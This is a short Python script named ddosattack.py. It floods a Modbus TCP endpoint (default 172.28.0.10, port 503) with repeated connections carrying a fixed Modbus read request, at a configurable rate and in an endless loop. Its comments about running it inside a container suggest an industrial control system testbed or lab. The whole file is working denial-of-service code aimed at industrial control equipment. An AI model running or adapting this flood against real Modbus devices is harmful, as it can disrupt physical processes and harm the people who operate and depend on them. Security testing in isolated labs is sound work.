#!/usr/bin/env python3
import socket
import time
import sys

# application:

# simply execute 
# > python ddosattack.py
# when desired inside of the container

# alternativly:
# > python ddosattack.py [ipaddress here] default [num of packets here]


l = len(sys.argv)

target_ip = "172.28.0.10"
target_port = 503
msg_per_second =500

if len(sys.argv) > 1:
    target_ip = sys.argv[1] if sys.argv[1] != "default" else target_ip

if len(sys.argv) > 2:
    target_port = int(sys.argv[2]) if sys.argv[2] != "default" else target_port

if len(sys.argv) > 3:
    msg_per_second = int(sys.argv[3]) if sys.argv[3] != "default" else msg_per_second


print(f"target_ip: {target_ip}, target_port: {target_port}, msg_per_second: {msg_per_second}")

message = b"\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01"  # Example Modbus request

# Create a socket
def send_flood():
    n = 0
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((target_ip, target_port))
                print(f"({n}) Send packets...")
                n = n+1
                s.sendall(message)

        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1/msg_per_second)  # Adjust frequency of packets

# Run the flood
if __name__ == "__main__":
    send_flood()